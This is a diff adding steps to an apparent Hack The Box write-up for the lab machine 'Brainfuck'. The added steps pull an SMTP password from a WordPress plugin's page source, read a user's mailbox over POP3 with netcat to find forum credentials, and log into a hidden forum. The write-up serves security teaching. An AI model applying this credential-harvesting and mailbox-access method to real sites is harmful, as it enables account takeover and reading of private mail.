@@ -391,6 +391,84 @@ Interesting Finding(s):
 + Go to `https://brainfuck.htb/wp-admin/` , and redirects to admin panel without authentication.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec18c42b-9394-44b3-858f-3e24464f4fda)
 
++ Click on the plugin, and choose `Easy WP SMTP`.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f793f890-82bb-44cc-a78c-f1cda55179a1)
+
++ Inspect the password value on the settings on page source view:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e51b96af-a6eb-4d8d-abd8-5b6f7037a110)
+
++ Got the username and password for SMTP service: `orestis`:`kHGuERB29DNiNE`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/82d080a3-84cc-4d11-beb9-56d82faaf609)
+
++ Let’s move to the port 110 and see if this user have any emails:
+```
+┌──(kali㉿kali)-[~]
+└─$ nc 10.10.10.17 110
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+RETR  
+-ERR Invalid message number: 
+RETR 1
++OK 977 octets
+Return-Path: <www-data@brainfuck.htb>
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress <wordpress@brainfuck.htb>
+Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+.
+RETR 2
++OK 514 octets
+Return-Path: <root@brainfuck.htb>
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: <20170429101206.4227420AEB@brainfuck>
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our "secret" forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+
+```                                               
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4d94daac-2cf2-46d9-8c14-df834c6ccdec)
+
++ Login `https://sup3rs3cr3t.brainfuck.htb/` using  `orestis`:`kHGuERB29DNiNE` credentials:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/567ba3d0-7263-4b29-9471-66a57411d765)
 
 
 
